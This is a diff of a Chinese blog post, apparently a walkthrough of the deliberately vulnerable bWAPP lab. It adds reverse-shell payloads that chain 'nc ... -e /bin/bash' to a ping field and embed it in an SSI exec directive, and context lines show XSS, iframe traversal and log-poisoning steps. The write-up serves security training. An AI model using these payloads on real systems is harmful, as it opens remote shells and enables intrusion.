@@ -124,13 +124,16 @@
 <meta property="og:image" content="https://i.loli.net/2018/10/23/5bceb7091fbae.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/23/5bcebd99c84b5.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/23/5bcebe1a49666.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd16c2ca1d21.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd16c2ca1d21.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/24/5bd05fefd440b.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/23/5bcec73ad400c.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/24/5bd063dbbb2bb.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/24/5bd0680a86054.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1730d526f7.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/24/5bd069d01db9c.png">
 <meta property="og:image" content="https://i.loli.net/2018/10/24/5bd06a6608a03.png">
-<meta property="og:updated_time" content="2018-10-24T13:00:23.301Z">
+<meta property="og:updated_time" content="2018-10-25T07:40:03.036Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bwapp玩法总结之一">
 <meta name="twitter:description" content="bwapp玩法总结之一html injection-Reflected(GET)类型1，low级别，随便输入，观察到输入什么即会输出什么。（即没有进行任何过滤）  输入&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;可以成功弹框，说明存在html注入。（注明：html注入包含xss注入）  可以以读取跟目录下的图片： 在输入框中输入： 1&amp;lt;img src=&amp;quo">
@@ -411,7 +414,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.9k
+                  3.1k
                 </span>
               
 
@@ -512,6 +515,7 @@
 <p>对留言框的输入使用了xss_check_3函数进行过滤，xss_check_3函数源码如下：</p>
 <p><img src="https://i.loli.net/2018/10/08/5bbb059405d5b.png" alt="volcano18"></p>
 <p>然而在xss_check_3中使用了防止html注入的终极函数htmlspecialchars()，所以在html injection-stored(blog)类型中，不论是medium级别还是high级别均无法进行注入。</p>
+<p>3，在high级别下没法注入。</p>
 <h2 id="iFrame-Injection类型"><a href="#iFrame-Injection类型" class="headerlink" title="iFrame Injection类型"></a>iFrame Injection类型</h2><p>1,在low级别下，首先从url：<a href="http://192.168.174.128/bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250" target="_blank" rel="noopener">http://192.168.174.128/bWAPP/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250</a> 观察到robots.txt文件，刚刚好被读取到界面上显示，于是查看源码发现，ParamUrl后面所包含的路径直接内嵌在iframe标签中：如图：</p>
 <p><img src="https://i.loli.net/2018/10/08/5bbb3e25b0b13.png" alt="volcano18"></p>
 <p>于是我进行了如下利用，读取根目录下的index.png图片，将url改为：<a href="http://192.168.174.128/bWAPP/iframei.php?ParamUrl=192.168.174.128/../../index.png&amp;ParamWidth=250&amp;ParamHeight=250即可以成功读取根目录下的图片：" target="_blank" rel="noopener">http://192.168.174.128/bWAPP/iframei.php?ParamUrl=192.168.174.128/../../index.png&amp;ParamWidth=250&amp;ParamHeight=250即可以成功读取根目录下的图片：</a></p>
@@ -557,7 +561,18 @@
 <p><img src="https://i.loli.net/2018/10/23/5bcebe1a49666.png" alt="123"></p>
 <p>在high级别下，继续使用commix发现也出了shell但是其实是没法执行命令的，个人认为是commix的缓存作用，sqlmap也遇到过类似的情况。</p>
 <p>commix一用就上瘾了啊。</p>
-<h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection - Blind"></a>OS Command Injection - Blind</h2><p>本人没有注入，有兴趣的可以参考博客：<a href="http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html" target="_blank" rel="noopener">http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html</a></p>
+<h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection - Blind"></a>OS Command Injection - Blind</h2><p>在low级别下，直接反弹shell吧。首先在自己的kali上使用nc -lvp 4445对4445端口进行监听，后在输入框输入如下命令：点击ping</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.174.133 &amp;&amp; nc 192.168.174.133 4445 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>成功拿到shell</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd16c2ca1d21.png" alt="volcano18"></p>
+<p>在medium级别下，照样反弹shell。</p>
+<p>输入命令后点击ping</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.174.133 | nc 192.168.174.133 4446 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p>成功拿到shell</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd16c2ca1d21.png" alt="volcano18"></p>
+<p>在high级别下没有注入成功。</p>
+<p>送上一篇有关os命令注入的文章：</p>
+<p><a href="http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html" target="_blank" rel="noopener">http://thehackpot.blogspot.com/2014/05/blind-os-command-injection-attacks.html</a></p>
 <h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h2><p>在url后面直接加上</p>
 <p>?message=id</p>
 <p>即将url设置为：<a href="http://192.168.174.130/bWAPP/phpi.php?message=pwd发现直接返回了pwd" target="_blank" rel="noopener">http://192.168.174.130/bWAPP/phpi.php?message=pwd发现直接返回了pwd</a></p>
@@ -576,9 +591,12 @@
 <p>过滤代码如下：</p>
 <p><img src="https://i.loli.net/2018/10/24/5bd0680a86054.png" alt="18"></p>
 <p>推荐一篇关于php code injection的文章：<a href="http://www.polaris-lab.com/index.php/archives/254/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/254/</a></p>
-<h2 id="Server-Side-Includes-SSI-Injection-服务器端包含注入"><a href="#Server-Side-Includes-SSI-Injection-服务器端包含注入" class="headerlink" title="Server-Side Includes (SSI) Injection(服务器端包含注入)"></a>Server-Side Includes (SSI) Injection(服务器端包含注入)</h2><p>由于本人并没有做过web开发，所以自然对ssl并不是很了解，今年干一年web开发，日后会进行补充。下面找到一篇有关ssl注入的文章：</p>
+<h2 id="Server-Side-Includes-SSI-Injection-服务器端包含注入"><a href="#Server-Side-Includes-SSI-Injection-服务器端包含注入" class="headerlink" title="Server-Side Includes (SSI) Injection(服务器端包含注入)"></a>Server-Side Includes (SSI) Injection(服务器端包含注入)</h2><p>也就是通过在输入框通过包含一些命令，使服务端执行啦</p>
+<p>比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd = &quot;id&quot;--&gt;</span><br><span class="line">拿shell吧：</span><br><span class="line">&lt;!--#exec cmd = &quot;nc 192.168.174.133 1818 -e /bin/bash&quot;--&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/25/5bd1730d526f7.png" alt="volcano18"></p>
+<p>由于本人并没有做过web开发，所以自然对ssl并不是很了解，其实个人理解也就是通过一定的方式，比如包含，使服务端执行我们自定义的命令罢了。今年干一年web开发，日后会进行补充。下面找到一篇有关ssl注入的文章：</p>
 <p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
-<!--#exec cmd = "id"-->
 <h2 id="bwapp日志写马拿shell"><a href="#bwapp日志写马拿shell" class="headerlink" title="bwapp日志写马拿shell"></a>bwapp日志写马拿shell</h2><p>找到bwapp靶机中的日志目录为：</p>
 <p><a href="http://192.168.174.130/var/log/apache2/access.log" target="_blank" rel="noopener">http://192.168.174.130/var/log/apache2/access.log</a></p>
 <p>直接写木马了：</p>
@@ -751,7 +769,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -879,7 +897,7 @@
 -->
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共5.8k字</span>
+  <span class="post-count">博客全站共8.4k字</span>
 </div>
 
         
